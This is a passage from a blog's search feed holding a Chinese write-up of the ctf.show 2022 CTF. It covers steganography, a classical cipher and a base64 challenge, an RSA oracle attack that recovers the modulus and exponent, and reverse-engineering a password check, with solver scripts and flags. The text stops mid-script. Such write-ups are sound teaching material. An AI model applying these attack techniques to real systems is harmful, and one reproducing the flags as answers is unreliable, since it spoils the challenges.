<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>单身杯(dsb) 2022</title>
    <link href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/"/>
    <url>/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/</url>
    
    <content type="html"><![CDATA[<p>ctf.show的2022单身杯中 没大没小的串串、古典base、TooYoungRSA、re签到、magic、pwn签到的题解。</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" alt="我的520" style="zoom: 33%;" /><p>我觉得我连萌新都不如…</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="没大没小的串串"><a class="markdownIt-Anchor" href="#没大没小的串串"></a> 没大没小的串串</h2><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">描述:<br>打乱了大小写的<span class="hljs-built_in">flag</span>是 y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns<br>其中正确的<span class="hljs-built_in">flag</span>的md5是 <span class="hljs-number">7513209051</span>f455fa44d0fa5cd0f3e051<br></code></pre></td></tr></table></figure><p>写个爆破脚本跑就行了。我自己不知道有什么好的笛卡尔乘积的生成方法。所以这个代码不太好看…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br>data1 = <span class="hljs-string">&quot;y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns&quot;</span>.upper()<br>data2 = data1.lower()<br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data1)):<br>    <span class="hljs-keyword">if</span> data1[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]:<br>        data.append([data1[i]])<br>        <span class="hljs-keyword">continue</span><br>    data.append([data1[i], data2[i]])<br><br>x = itertools.product(data[<span class="hljs-number">0</span>],data[<span class="hljs-number">1</span>],data[<span class="hljs-number">2</span>],data[<span class="hljs-number">3</span>],data[<span class="hljs-number">4</span>],data[<span class="hljs-number">5</span>],data[<span class="hljs-number">6</span>],data[<span class="hljs-number">7</span>],<br>                  data[<span class="hljs-number">8</span>],data[<span class="hljs-number">9</span>],data[<span class="hljs-number">10</span>],data[<span class="hljs-number">11</span>],data[<span class="hljs-number">12</span>],data[<span class="hljs-number">13</span>],data[<span class="hljs-number">14</span>],data[<span class="hljs-number">15</span>],<br>                  data[<span class="hljs-number">16</span>],data[<span class="hljs-number">17</span>],data[<span class="hljs-number">18</span>],data[<span class="hljs-number">19</span>],data[<span class="hljs-number">20</span>],data[<span class="hljs-number">21</span>],data[<span class="hljs-number">22</span>],data[<span class="hljs-number">23</span>],<br>                  data[<span class="hljs-number">24</span>],data[<span class="hljs-number">25</span>],data[<span class="hljs-number">26</span>],data[<span class="hljs-number">27</span>],data[<span class="hljs-number">28</span>],data[<span class="hljs-number">29</span>],data[<span class="hljs-number">30</span>],data[<span class="hljs-number">31</span>],<br>                  data[<span class="hljs-number">32</span>],data[<span class="hljs-number">33</span>],data[<span class="hljs-number">34</span>],data[<span class="hljs-number">35</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-string">&quot;&quot;</span>.join(i).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest() == <span class="hljs-string">&quot;7513209051f455fa44d0fa5cd0f3e051&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS</span><br><span class="hljs-comment"># ctfshow&#123;y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="misc签到"><a class="markdownIt-Anchor" href="#misc签到"></a> misc签到</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">重要提示：<br>压缩包密码是<span class="hljs-number">5</span>位字符<br>lsb有内容<br><span class="hljs-built_in">flag</span>包含<span class="hljs-number">5</span>个空格、<span class="hljs-number">2</span>个逗号，均替换为下划线，连续只留<span class="hljs-number">1</span>个下划线<br></code></pre></td></tr></table></figure><p>压缩包直接爆破密码。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">61f@</span>X<br></code></pre></td></tr></table></figure><p>然后他说lsb里面有内容，直接stegosolve抓lsb结果啥都没找到，怀疑不会藏在中间部分了。结果看了一圈lsb都没找到有用的信息…</p><p>最后直接查看二进制的图片发现文件尾部附上了一段base64。看来做题还得走一个标准流程，指不定就忘了…</p><p>得到的base64 cyberchef转换一下。是一个缺少定位标的二维码。</p><p>先把定位标补上。嗯好像这个二维码有点不太符合规范，按理来说定位标附近实要留白的，这里确实黑色。所以现将二维码反色再添加。</p><p>得到：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">6</span>C75652C20666172206578636565647320796F75722062656C6965667D<br><span class="hljs-built_in">lue,</span> far exceeds your belief&#125;<br></code></pre></td></tr></table></figure><p>这个只是一部分的，那么还缺少一部分。</p><p>到这里只有LSB的提示没有用了，所以猜测是lsb。StegoSolve看这个二维码没找到，那应该是软件隐写。一圈软件照下来都没找到…</p><p>最后再网上搜LSB工具的时候找到个zsteg，这个我还没用过，不过看评价还挺不错？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/CTF/dsb]<br>└─$ zsteg -a download.png<br>b6,abgr,msb,xy      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,xy      .. file: , 48 kHz, Monaural<br>b8,rgb,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b8,rgba,msb,xy      .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b1,r,lsb,xy,prime   .. file: MPEG ADTS, layer II, v1, 112 kbps, Stereo<br>b1,r,lsb,yx         .. text: &quot;ctfshow&#123;Your potential,va&quot;<br>b6,abgr,msb,yx      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,yx      .. file: , 48 kHz, Monaural<br><br></code></pre></td></tr></table></figure><p>这里能看到我们的flag了。好像确实挺好用的？ 工具+1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ctfshow&#123;Your potential,value, far exceeds your belief&#125;</span><br></code></pre></td></tr></table></figure><p>然后忘了换里面的字符了…</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># ctfshow&#123;Your_potential_value_far_exceeds_your_belief&#125;</span><br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="古典base"><a class="markdownIt-Anchor" href="#古典base"></a> 古典base</h2><p>我这边得到的信息是：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YRchdsYIYNY0ZALQZYYIY0NUNQMZNNC</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>m2v3wj0zjS0j4T4DtjwiyDymy2l29g<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>可以看到两个==位置不对，能这样改变字符位置的，应该是栅栏密码，分组长度应该为2</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">3</span>Rmc<span class="hljs-number">2</span>hvd<span class="hljs-number">3</span>swYjI<span class="hljs-number">0</span>Yz<span class="hljs-symbol">NjYS00</span>ZjA<span class="hljs-number">4</span>LTQ<span class="hljs-number">4</span>ZDYtYjIwYi<span class="hljs-number">0</span>y<span class="hljs-symbol">NDUyNmQyM2</span>Zl<span class="hljs-symbol">N2</span><span class="hljs-symbol">N9</span>Cg==<br></code></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">0</span>b24c3ca-<span class="hljs-number">4</span>f08-<span class="hljs-number">48</span>d6-b20b-<span class="hljs-number">24526</span>d23fe7c&#125;<br></code></pre></td></tr></table></figure><h2 id="tooyoungrsa"><a class="markdownIt-Anchor" href="#tooyoungrsa"></a> TooYoungRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nevergonnagiveyouup <span class="hljs-keyword">import</span> n, e<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br><br>    k = secrets.randbelow(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ck = <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(k, e, n)&#125;</span>&quot;</span>)<br>    key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ct = <span class="hljs-subst">&#123;cipher.encrypt(pad(flag, AES.block_size)).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        nevergonnaletyoudown = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;I just wanna tell you how i&#x27;m feeling... &quot;</span>))<br>        <span class="hljs-keyword">assert</span> nevergonnaletyoudown &gt;= <span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gotta make you understand: <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(nevergonnaletyoudown, e, n)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>链接nc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;nc pwn.challenge.ctf.show 28155<br>ck = 53830851938944413421825489946783740501<br>ct = 2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176<br>I just wanna tell you how i&#x27;m feeling...<br>2<br>gotta make you understand: 9088662731338809664100216653347181076<br>I just wanna tell you how i&#x27;m feeling...<br>4<br>gotta make you understand: 61547101391097434247253645201221024635<br>I just wanna tell you how i&#x27;m feeling...<br>8<br>gotta make you understand: 9368775312576566895016755847461863720<br>I just wanna tell you how i&#x27;m feeling...<br>16<br>gotta make you understand: 75933324863129460082479849068964500501<br>I just wanna tell you how i&#x27;m feeling...<br></code></pre></td></tr></table></figure><p>选择明文攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> gmpy2 import gcd<br><br><span class="hljs-attribute">c2</span> = <span class="hljs-number">9088662731338809664100216653347181076</span><br><span class="hljs-attribute">c4</span> = <span class="hljs-number">61547101391097434247253645201221024635</span><br><span class="hljs-attribute">c8</span> = <span class="hljs-number">9368775312576566895016755847461863720</span><br><span class="hljs-attribute">c16</span> = <span class="hljs-number">75933324863129460082479849068964500501</span><br><br><span class="hljs-attribute">dif1</span> = pow(c2,<span class="hljs-number">2</span>) - c4<br><span class="hljs-attribute">dif2</span> = pow(c2,<span class="hljs-number">3</span>) - c8<br><span class="hljs-attribute">dif3</span> = pow(c2,<span class="hljs-number">4</span>) - c16<br><br><br><span class="hljs-attribute">n</span> = gcd(gcd(dif1,dif2), gcd(dif2,dif3))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> pow(<span class="hljs-number">2</span>, e, n) != c2:<br>    <span class="hljs-attribute">e</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;e = &quot;</span>, e)<br><br><span class="hljs-comment"># n =  190128968349217409128719777740062362481</span><br><span class="hljs-comment"># e =  652019</span><br></code></pre></td></tr></table></figure><p>这里其实只用两个dif做GCD也可以的。如果e跑的时间比较久的话，可以考虑重新获取数据，重新连一下nc，他会重新生成n和e的。</p><p>得到的n用yafu分解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">starting SIQS on c39: 190128968349217409128719777740062362481<br><br>==== sieving in progress (1 thread):     624 relations needed ====<br>====           Press ctrl-c to abort and save state           ====<br>518 rels found: 285 full + 233 from 2212 partial, (30808.14 rels/sec)<br><br>SIQS elapsed time = 0.1090 seconds.<br>Total factoring time = 0.2692 seconds<br><br><br>***factors found***<br><br>P20 = 14093563172030264239<br>P20 = 13490482571968928479<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>最后求d，然后AES解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd, invert, powmod<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>n =  <span class="hljs-number">190128968349217409128719777740062362481</span><br>p = <span class="hljs-number">14093563172030264239</span><br>q = <span class="hljs-number">13490482571968928479</span><br>e =  <span class="hljs-number">652019</span><br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>ck = <span class="hljs-number">53830851938944413421825489946783740501</span><br>ct = <span class="hljs-string">&quot;2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176&quot;</span><br><br>k = powmod(ck,d,n)<br>key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br><br><span class="hljs-built_in">print</span>(cipher.decrypt(<span class="hljs-built_in">bytes</span>.fromhex(ct)))<br><br><span class="hljs-comment"># ctfshow&#123;8dcb976f-5e92-4d36-89ac-c2273bf442e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="re签到"><a class="markdownIt-Anchor" href="#re签到"></a> re签到</h2><p>IDA打开里面有个很像base64的字符串，拉出来base64解密即可得到flag。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">V2toT2FWZ3pTbXhZTTA1d1dqSTFabUZYTldaaFNFNTZZek5PZW1NelRucGpkejA5<br><span class="hljs-section">decode:</span><br>WkhOaVgzSmxYM05wWjI1ZmFXNWZhSE56YzNOemMzTnpjdz09<br><span class="hljs-section">decode:</span><br>ZHNiX3JlX3NpZ25faW5faHNzc3Nzc3Nzcw==<br><span class="hljs-section">decode:</span><br>dsb_re_sign_in_hsssssssss<br><br><span class="hljs-comment"># ctfshow&#123;dsb_re_sign_in_hsssssssss&#125;</span><br></code></pre></td></tr></table></figure><h2 id="magic"><a class="markdownIt-Anchor" href="#magic"></a> magic</h2><p>题目信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>个密码只有<span class="hljs-number">1</span>个是正确的<br></code></pre></td></tr></table></figure><p>逆向。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;plz input your password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkToken(v5) )<br>    <span class="hljs-built_in">puts</span>(aCongratulation);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;password is incorrect!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入checkToken函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkToken</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkSum(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)p(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)h(a1);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里返回一个bool根据判断条件，这里要这三个都为真才可以。</p><p>进入第一个checkSum。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkSum</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 += a1 % <span class="hljs-number">10</span>;<br>    a1 /= <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3 == <span class="hljs-number">58</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个是判断a1这个数的所有十进制位的数字之和是不是58。</p><p>进入p函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">p</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; <span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)a1) &gt;= (<span class="hljs-type">double</span>)i; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !(a1 % i) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>素数判定函数。</p><p>进入h函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">h</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = a1;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 /= <span class="hljs-number">10</span>;<br>    ++v4;<br>  &#125;<br>  v3 = a1;<br>  <span class="hljs-keyword">while</span> ( v3 )<br>  &#123;<br>    v5 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 / <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)));<br>    v6 = v3 % <span class="hljs-number">10</span>;<br>    v3 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 - <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)) * (<span class="hljs-type">double</span>)v5) / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v5 != v6 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v4 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断这个数是不是一个回文数。</p><p>所以这个数有三个条件，他是一个回文素数，同时他的所有位之和为58。接下来写个脚本来跑。为了时间上能更快，我们先生成回文数，在判断这个数是不是素数，再判断和是否为58。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-comment"># 位数之和为58</span><br><span class="hljs-comment"># 是一个素数</span><br><span class="hljs-comment"># 是一个回文数</span><br><span class="hljs-comment"># 如果位数之和为58至少需要6位，一个int有10位，所以可选的部分位6,7,8,9,10位</span><br>Palind = []<br><br><span class="hljs-comment"># 6 位 回文数</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            temp = <span class="hljs-number">100001</span>*n+<span class="hljs-number">10010</span>*m+<span class="hljs-number">1100</span>*k<br>            <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                Palind.append(temp)<br><span class="hljs-comment"># 